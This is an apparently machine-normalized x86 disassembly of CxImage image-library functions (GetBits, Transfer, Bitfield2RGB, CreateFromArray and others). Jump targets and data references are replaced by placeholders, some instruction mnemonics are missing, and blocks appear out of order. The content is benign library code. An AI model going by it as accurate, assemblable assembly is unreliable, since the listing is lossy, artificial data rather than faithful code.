mov eax [ ebp + 0xc ]
mov [ edx + 0x10 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] 0x1
mov edx [ ebp - 0x4 ]
mov ax [ ebp + 0x10 ]
mov [ edx + 0x16 ] ax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x30 ]
imul eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x1c ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] 0x0
mov ecx [ ebp - 0x4 ]
call ?GetSize@CxImage@@QAEJXZ
mov esi esp
push eax
call [ malloc@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x28 ] 0x10
jmp r-xdata
cmp [ ebp - 0x10 ] 0x8
je r-xdata
mov ecx [ ebp - 0x4 ]
call ?GetPalette@CxImage@@QBEPAUtagRGBQUAD@@XZ
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push r--data
mov eax [ ebp - 0x4 ]
add eax 0x44
push eax
call strcpy
add esp 0x8
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] 0x100
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x19c ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
call ?GetPaletteSize@CxImage@@QAEKXZ
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
push ecx
call memset
add esp 0xc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a0 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
call ?SelectionDelete@CxImage@@QAE_NXZ
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0xc ] edx
mov esi [ ebp - 0x4 ]
add esi 0x8
mov ecx 0xa
mov edi [ ebp - 0xc ]
[ edi ] [ esi ]
push 0x0
mov ecx [ ebp - 0x4 ]
call ?GetBits@CxImage@@QAEPAEK@Z
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x34 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp - 0x4 ]
call ?AlphaDelete@CxImage@@QAEXXZ
?GetBits@CxImage@@QAEPAEK@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp - 0x4 ]
mov esi [ ecx + 0x4 ]
add esi [ eax ]
mov ecx [ ebp - 0x4 ]
call ?GetPaletteSize@CxImage@@QAEKXZ
add eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
cmp edx [ ecx + 0x10 ]
jae r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov esi [ edx + 0x4 ]
add esi [ ecx ]
mov ecx [ ebp - 0x4 ]
call ?GetPaletteSize@CxImage@@QAEKXZ
add esi eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
imul ecx [ ebp + 0x8 ]
add esi ecx
mov eax esi
jmp r-xdata
?GetSize@CxImage@@QAEJXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x8 ]
mov ecx [ ebp - 0x4 ]
add esi [ ecx + 0x1c ]
mov ecx [ ebp - 0x4 ]
call ?GetPaletteSize@CxImage@@QAEKXZ
add eax esi
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
?IsInside@CxImage@@QAE_NJJ@Z
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0xc ] 0x0
jl r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ eax + 0x10 ]
jge r-xdata
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
cmp eax [ edx + 0xc ]
jge r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov al [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
?Clear@CxImage@@QAEXE@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x1c ]
push edx
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
push edx
call memset
add esp 0xc
?Transfer@CxImage@@QAE_NAAV1@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call ?Destroy@CxImage@@QAE_NXZ
and eax 0xff
test eax eax
jne r-xdata
push 0x28
mov eax [ ebp + 0x8 ]
add eax 0x8
push eax
mov ecx [ ebp - 0x4 ]
add ecx 0x8
push ecx
call memcpy
add esp 0xc
push 0x16c
mov edx [ ebp + 0x8 ]
add edx 0x30
push edx
mov eax [ ebp - 0x4 ]
add eax 0x30
push eax
call memcpy
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x19c ]
mov [ ecx + 0x19c ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1a0 ]
mov [ ecx + 0x1a0 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1a4 ]
mov [ ecx + 0x1a4 ] eax
push 0x28
push 0x0
mov ecx [ ebp + 0x8 ]
add ecx 0x8
push ecx
call memset
add esp 0xc
push 0x16c
push 0x0
mov edx [ ebp + 0x8 ]
add edx 0x30
push edx
call memset
add esp 0xc
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1a0 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x19c ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1a4 ] 0x0
mov al 0x1
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
?Ghost@CxImage@@IAEXPAV1@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
push 0x28
mov eax [ ebp + 0x8 ]
add eax 0x8
push eax
mov ecx [ ebp - 0x4 ]
add ecx 0x8
push ecx
call memcpy
add esp 0xc
push 0x16c
mov edx [ ebp + 0x8 ]
add edx 0x30
push edx
mov eax [ ebp - 0x4 ]
add eax 0x30
push eax
call memcpy
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x19c ]
mov [ ecx + 0x19c ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1a0 ]
mov [ ecx + 0x1a0 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1a4 ]
mov [ ecx + 0x1a4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x38 ] edx
?Bitfield2RGB@CxImage@@IAEXPAEGGGE@Z
push ebp
mov ebp esp
sub esp 0x9c
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x9c ]
mov ecx 0x27
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov al [ ebp + 0x18 ]
mov [ ebp - 0x5c ] al
cmp [ ebp - 0x5c ] 0x10
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
cmp [ ebp - 0x5c ] 0x20
je r-xdata
cmp [ ebp - 0x14 ] 0x10
jge r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
shl eax 0x2
mov [ ebp - 0x3c ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
mov [ ebp - 0x50 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
sub ecx 0x1
mov [ ebp - 0x54 ] ecx
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
mov eax 0x8
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
sub ecx 0x8
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
sub edx 0x8
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
add eax 0x1
cdq
sub eax edx
sar eax 0x1
shl eax 0x2
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
sub ecx 0x1
mov [ ebp - 0x34 ] ecx
jmp r-xdata
mov edx [ ebp + 0xc ]
and edx 0xffff
mov ecx [ ebp - 0x14 ]
sar edx cl
and edx 0x1
test edx edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
cmp [ ebp - 0x34 ] 0x0
jl r-xdata
mov edx [ ebp + 0x10 ]
and edx 0xffff
mov ecx [ ebp - 0x14 ]
sar edx cl
and edx 0x1
test edx edx
je r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x3c ]
imul eax [ ebp - 0x54 ]
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x30 ]
imul edx [ ebp - 0x54 ]
mov [ ebp - 0x44 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
sub ecx 0x1
mov [ ebp - 0x58 ] ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x34 ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x30 ]
imul edx [ ebp - 0x34 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
sub ecx 0x1
mov [ ebp - 0x38 ] ecx
jmp r-xdata
mov edx [ ebp + 0x14 ]
and edx 0xffff
mov ecx [ ebp - 0x14 ]
sar edx cl
and edx 0x1
test edx edx
je r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x58 ] 0x0
jl r-xdata
cmp [ ebp - 0x38 ] 0x0
jl r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x40 ]
lea edx [ ecx + eax * 4 ]
mov [ ebp - 0x48 ] edx
mov eax [ ebp - 0x58 ]
imul eax eax 0x3
add eax [ ebp - 0x44 ]
mov [ ebp - 0x4c ] eax
mov ecx [ ebp - 0x50 ]
add ecx [ ebp - 0x4c ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x48 ]
mov al [ edx ]
mov [ ecx ] al
mov ecx [ ebp - 0x50 ]
add ecx [ ebp - 0x4c ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x48 ]
mov al [ edx + 0x1 ]
mov [ ecx + 0x1 ] al
mov ecx [ ebp - 0x50 ]
add ecx [ ebp - 0x4c ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x48 ]
mov al [ edx + 0x2 ]
mov [ ecx + 0x2 ] al
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x20 ]
lea edx [ ecx + eax * 2 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x38 ]
imul eax eax 0x3
add eax [ ebp - 0x24 ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x28 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x28 ]
xor ecx ecx
mov cl [ eax + 0x1 ]
shl ecx 0x8
add edx ecx
mov [ ebp - 0x1c ] dx
mov edx [ ebp - 0x1c ]
and edx 0xffff
mov eax [ ebp + 0x14 ]
and eax 0xffff
and edx eax
mov ecx [ ebp - 0x10 ]
shl edx cl
mov ecx [ ebp - 0x30 ]
add ecx [ ebp - 0x2c ]
mov [ ecx ] dl
mov edx [ ebp - 0x1c ]
and edx 0xffff
mov eax [ ebp + 0x10 ]
and eax 0xffff
and edx eax
mov ecx [ ebp - 0xc ]
sar edx cl
mov ecx [ ebp - 0x30 ]
add ecx [ ebp - 0x2c ]
mov [ ecx + 0x1 ] dl
mov edx [ ebp - 0x1c ]
and edx 0xffff
mov eax [ ebp + 0xc ]
and eax 0xffff
and edx eax
mov ecx [ ebp - 0x8 ]
sar edx cl
mov ecx [ ebp - 0x30 ]
add ecx [ ebp - 0x2c ]
mov [ ecx + 0x2 ] dl
jmp r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x54 ]
sub edx 0x1
mov [ ebp - 0x54 ] edx
mov edx [ ebp - 0x58 ]
sub edx 0x1
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x34 ]
sub edx 0x1
mov [ ebp - 0x34 ] edx
mov edx [ ebp - 0x38 ]
sub edx 0x1
mov [ ebp - 0x38 ] edx
?CreateFromArray@CxImage@@QAE_NPAEKKKK_N@Z
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x5c ]
mov ecx 0x17
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x1
je r-xdata
xor al al
jmp r-xdata
push 0x0
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call ?Create@CxImage@@QAEPAXKKKK@Z
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x5c
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x18
cmp [ ebp + 0x14 ] 0x18
jae r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0x14 ] 0x8
je r-xdata
cmp [ ebp + 0x14 ] 0x20
jne r-xdata
mov ecx [ ebp - 0x4 ]
call ?SetGrayPalette@CxImage@@QAEXXZ
cmp [ ebp + 0x14 ] 0x18
je r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
call ?AlphaCreate@CxImage@@QAEXXZ
cmp [ ebp + 0x14 ] 0x20
je r-xdata
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
xor al al
jmp r-xdata
mov al 0x1
mov edx [ ebp + 0x1c ]
and edx 0xff
test edx edx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x18 ] ecx
mov eax [ ebp + 0x10 ]
sub eax 0x1
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
cmp ecx [ ebp + 0x18 ]
jae r-xdata
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
imul eax [ edx + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
add edx eax
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x10 ]
imul eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
mov [ ebp - 0xc ] ecx
cmp [ ebp + 0x14 ] 0x20
jne r-xdata
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x30 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x1c ]
push edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
call memcpy
add esp 0xc
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov al [ edx ]
mov [ ecx ] al
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov cl [ eax + 0x1 ]
mov [ edx ] cl
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov dl [ ecx + 0x2 ]
mov [ eax ] dl
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0xc ]
mov dl [ ecx + 0x3 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x14 ]
push ecx
mov ecx [ ebp - 0x4 ]
call ?AlphaSet@CxImage@@QAEXJJE@Z
mov edx [ ebp - 0xc ]
add edx 0x4
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
?CreateFromMatrix@CxImage@@QAE_NPAPAEKKKK_N@Z
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x5c ]
mov ecx 0x17
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x1
je r-xdata
xor al al
jmp r-xdata
push 0x0
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call ?Create@CxImage@@QAEPAXKKKK@Z
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x5c
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x18
cmp [ ebp + 0x14 ] 0x18
jae r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0x14 ] 0x8
je r-xdata
cmp [ ebp + 0x14 ] 0x20
jne r-xdata
mov ecx [ ebp - 0x4 ]
call ?SetGrayPalette@CxImage@@QAEXXZ
cmp [ ebp + 0x14 ] 0x18
je r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
call ?AlphaCreate@CxImage@@QAEXXZ
cmp [ ebp + 0x14 ] 0x20
je r-xdata
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
xor al al
jmp r-xdata
mov al 0x1
mov edx [ ebp + 0x1c ]
and edx 0xff
test edx edx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x18 ] ecx
mov eax [ ebp + 0x10 ]
sub eax 0x1
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x20
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
imul eax [ edx + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
add edx eax
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x30 ]
cmp edx [ ebp + 0x18 ]
jae r-xdata
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x1c ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp - 0x8 ]
push edx
call memcpy
add esp 0xc
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov cl [ eax ]
mov [ edx ] cl
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov dl [ ecx + 0x1 ]
mov [ eax ] dl
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov al [ edx + 0x2 ]
mov [ ecx ] al
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0xc ]
mov al [ edx + 0x3 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
mov ecx [ ebp - 0x4 ]
call ?AlphaSet@CxImage@@QAEXJJE@Z
mov eax [ ebp - 0xc ]
add eax 0x4
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
?CompareColors@CxImage@@KAHPBX0@Z
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
lea edi [ ebp - 0x50 ]
mov ecx 0x14
mov eax 0xcccccccc
[ edi ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx ]
imul eax eax 0x75
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x1 ]
imul edx edx 0x259
add eax edx
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x2 ]
imul edx edx 0x132
add eax edx
sar eax 0xa
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov cl [ eax ]
imul ecx ecx 0x75
mov edx [ ebp - 0x8 ]
xor eax eax
mov al [ edx + 0x1 ]
imul eax eax 0x259
add ecx eax
mov edx [ ebp - 0x8 ]
xor eax eax
mov al [ edx + 0x2 ]
imul eax eax 0x132
add ecx eax
sar ecx 0xa
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetTransColor@CxImage@@QAE?AUtagRGBQUAD@@XZ
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cx [ eax + 0x16 ]
cmp ecx 0x18
jge r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x150 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x14c ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov cl [ eax + 0x14c ]
push ecx
lea edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call ?GetPaletteColor@CxImage@@QAE?AUtagRGBQUAD@@E@Z
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x48
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
?GetColorType@CxImage@@QAEEXZ
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cx [ eax + 0x16 ]
xor edx edx
cmp ecx 0x8
setg dl
inc edx
mov [ ebp - 0x8 ] dl
mov ecx [ ebp - 0x4 ]
call ?AlphaIsValid@CxImage@@QAE_NXZ
and eax 0xff
test eax eax
je r-xdata
mov al [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
add esp 0x48
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
mov [ ebp - 0x8 ] 0x4
?SetXDPI@CxImage@@QAEXJ@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x164 ] ecx
fild [ ebp + 0x8 ]
fmul [ r--data ]
fdiv [ r--data ]
fadd [ r--data ]
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ floor@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
?SetYDPI@CxImage@@QAEXJ@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x168 ] ecx
fild [ ebp + 0x8 ]
fmul [ r--data ]
fdiv [ r--data ]
fadd [ r--data ]
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ floor@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] eax
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
?SetFlags@CxImage@@QAEXK_N@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
and eax 0xff
test eax eax
